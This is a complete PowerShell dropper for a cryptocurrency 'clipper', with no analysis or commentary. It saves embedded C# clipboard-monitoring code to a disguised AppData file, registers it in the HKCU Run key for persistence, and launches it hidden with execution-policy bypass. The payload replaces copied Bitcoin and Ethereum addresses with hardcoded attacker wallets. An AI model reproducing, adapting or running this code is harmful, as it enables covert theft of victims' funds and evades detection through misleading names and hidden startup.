$PayloadPath = "$env:APPDATA\win_service_cache.ps1"

$ClipperContent = @"
`$C = @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text.RegularExpressions;
namespace InternalAudit {
    public class Stealth : NativeWindow {
        private const uint WM_CLIP = 0x031D;
        [DllImport("user32.dll")] private static extern bool AddClipboardFormatListener(IntPtr h);
        [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr h);
        [DllImport("user32.dll")] private static extern bool CloseClipboard();
        [DllImport("user32.dll")] private static extern bool EmptyClipboard();
        [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint f);
        [DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint f, IntPtr m);
        [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr m);
        [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr m);
        [DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint f, UIntPtr b);

        private string btc = "bc1qcn7epnry70g4srng74qjwhnnrl5agq2jtnt70u";
        private string eth = "0x9124856aa1567303EfBC940223356B7d5b6E1493";

        public void Init() { this.CreateHandle(new CreateParams()); AddClipboardFormatListener(this.Handle); }
        protected override void WndProc(ref Message m) { if (m.Msg == WM_CLIP) { try { Run(); } catch {} } base.WndProc(ref m); }
        private void Run() {
            if (!OpenClipboard(this.Handle)) return;
            IntPtr h = GetClipboardData(13);
            if (h == IntPtr.Zero) { CloseClipboard(); return; }
            string t = Marshal.PtrToStringUni(GlobalLock(h));
            GlobalUnlock(h); CloseClipboard();
            string n = null;
            if (Regex.IsMatch(t.Trim(), @"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$") && t.Trim() != btc) n = btc;
            else if (Regex.IsMatch(t.Trim(), @"^0x[a-fA-F0-9]{40}$") && t.Trim() != eth) n = eth;
            if (n != null && OpenClipboard(this.Handle)) {
                EmptyClipboard();
                IntPtr m = GlobalAlloc(2, (UIntPtr)((n.Length + 1) * 2));
                Marshal.Copy(n.ToCharArray(), 0, GlobalLock(m), n.Length);
                GlobalUnlock(m); SetClipboardData(13, m);
                CloseClipboard();
            }
        }
    }
}
"@
Add-Type -TypeDefinition `$C -ReferencedAssemblies "System.Windows.Forms"
`$S = New-Object InternalAudit.Stealth
`$S.Init()
[System.Windows.Forms.Application]::Run()
"@

# 1. Save the payload to the hidden AppData folder
Set-Content -Path $PayloadPath -Value $ClipperContent

# 2. Add to Registry for Persistence (Survivability)
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegValue = "WindowsServiceCache"
$RegData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
Set-ItemProperty -Path $RegPath -Name $RegValue -Value $RegData

# 3. Start the process now (Decoupled from current CMD)
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
